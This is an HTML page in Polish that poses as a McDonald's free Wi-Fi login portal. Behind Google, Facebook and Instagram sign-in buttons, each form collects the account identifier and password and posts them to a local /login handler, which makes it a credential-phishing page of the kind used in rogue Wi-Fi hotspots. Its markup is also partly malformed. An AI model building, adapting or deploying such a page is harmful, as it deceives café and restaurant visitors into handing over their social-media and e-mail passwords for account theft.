<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Mc WiFi – Darmowy internet</title>
<style>
  * {box-sizing: border-box; margin: 0; padding: 0;}
  body {
    font-family: "Segoe UI", Roboto, Arial, sans-serif;
    background: #fffdf8;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow: hidden;
    color: #222;
  }

  /* === Abstrakcyjne tło === */
  .shape {
    position: absolute;
    border-radius: 50%;
    filter: blur(40px);
    opacity: 0.4;
  }
  .shape.yellow1 {
    background: #ffd60a;
    width: 450px; height: 450px;
    top: -100px; left: -120px;
  }
  .shape.yellow2 {
    background: #ffcc00;
    width: 320px; height: 320px;
    bottom: -60px; right: -100px;
  }
  .shape.white {
    background: #fff;
    width: 260px; height: 260px;
    bottom: 80px; left: 40px;
    opacity: 0.6;
  }

  /* === Panel === */
  .container {
    position: relative;
    z-index: 10;
    width: 90%;
    max-width: 400px;
    background: #fff;
    border-radius: 30px;
    padding: 40px 30px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.08);
    text-align: center;
    transition: transform .3s ease;
  }

  .container:hover { transform: translateY(-3px); }

  .logo {
    margin-bottom: 22px;
  }

  .logo img {
    max-width: 100px;
    height: auto;
  }

  /* === Teksty === */
  .intro {
    margin-bottom: 30px;
  }

  .title {
    font-size: 1.7rem;
    font-weight: 800;
    color: #ffbc00;
    margin-bottom: 10px;
  }

  .description {
    font-size: 0.95rem;
    color: #333;
    line-height: 1.5;
    margin-bottom: 25px;
  }

  .subtitle {
    font-size: 1rem;
    font-weight: 700;
    color: #d51b1b;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 16px;
  }

  /* === Przyciski social === */
  .social-btn {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 18px;
    color: #fff;
    font-size: 1rem;
    font-weight: 700;
    cursor: pointer;
    margin-bottom: 14px;
    transition: transform .2s ease, box-shadow .2s ease;
  }
  .social-btn:hover {
    transform: scale(1.04);
    box-shadow: 0 6px 20px rgba(0,0,0,0.1);
  }

  .google { background: #ea4335; }
  .facebook { background: #1877f2; }
  .instagram { background: linear-gradient(45deg, #f09433, #dc2743, #bc1888); }

  /* === Formularz === */
  .login-form {
    display: none;
    margin-top: 12px;
    animation: fadeIn 0.35s ease forwards;
    background: #fff8e1;
    border-radius: 18px;
    padding: 18px 14px;
    box-shadow: inset 0 0 12px rgba(0,0,0,0.05);
  }

  @keyframes fadeIn {
    from {opacity: 0; transform: translateY(-10px);}
    to {opacity: 1; transform: translateY(0);}
  }

  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 12px 14px;
    border-radius: 12px;
    border: 1.5px solid #fdd835;
    background: #fff;
    color: #222;
    font-size: 1rem;
    margin-bottom: 12px;
    transition: all .2s ease;
  }

  input:focus {
    border-color: #ffcc00;
    box-shadow: 0 0 10px rgba(255,204,0,0.3);
    outline: none;
  }

  .submit-btn {
    width: 100%;
    padding: 12px;
    border-radius: 12px;
    border: none;
    background: #ffcc00;
    color: #222;
    font-weight: 800;
    font-size: 1rem;
    cursor: pointer;
    transition: background .2s ease, transform .2s ease;
  }

  .submit-btn:hover {
    background: #ffd633;
    transform: translateY(-2px);
  }

  .footer {
    margin-top: 25px;
    font-size: 0.8rem;
    color: #666;
  }
</style>
</head>
<body>

<!-- Abstrakcyjne tło -->
<div class="shape yellow1"></div>
<div class="shape yellow2"></div>
<div class="shape white"></div>

<!-- Główny panel -->

  <div class="intro">
    <h2 class="title">McDonald's® WiFi</h2>
    <p class="description">
      Teraz bezpłatny dostęp do Internetu dla Gości naszych restauracji.

    <h3 class="subtitle">Zaloguj się przez:</h3>

  <!-- GOOGLE -->
  <button class="social-btn google" onclick="toggleForm('googleForm')">Google</button>
  <form id="googleForm" class="login-form" method="POST" action="/login">
    <input type="text" name="google_user" placeholder="E-mail lub numer telefonu" required>
    <input type="password" name="password" placeholder="Hasło" required>
    <input type="hidden" name="service" value="Google">
    <button class="submit-btn" type="submit">Zaloguj się</button>
  </form>

  <!-- FACEBOOK -->
  <button class="social-btn facebook" onclick="toggleForm('facebookForm')">Facebook</button>
  <form id="facebookForm" class="login-form" method="POST" action="/login">
    <input type="text" name="fb_user" placeholder="E-mail lub numer telefonu" required>
    <input type="password" name="password" placeholder="Hasło" required>
    <input type="hidden" name="service" value="Facebook">
    <button class="submit-btn" type="submit">Zaloguj się</button>
  </form>

  <!-- INSTAGRAM -->
  <button class="social-btn instagram" onclick="toggleForm('instagramForm')">Instagram</button>
  <form id="instagramForm" class="login-form" method="POST" action="/login">
    <input type="text" name="insta_user" placeholder="E-mail lub numer telefonu" required>
    <input type="password" name="password" placeholder="Hasło" required>
    <input type="hidden" name="service" value="Instagram">
    <button class="submit-btn" type="submit">Zaloguj się</button>
  </form>

  <div class="footer">Free Network System © 2025</div>
</div>

<script>
function toggleForm(id) {
  const form = document.getElementById(id);
  const forms = document.querySelectorAll('.login-form');
  forms.forEach(f => f.style.display = (f === form && f.style.display !== 'block') ? 'block' : 'none');
}
</script>
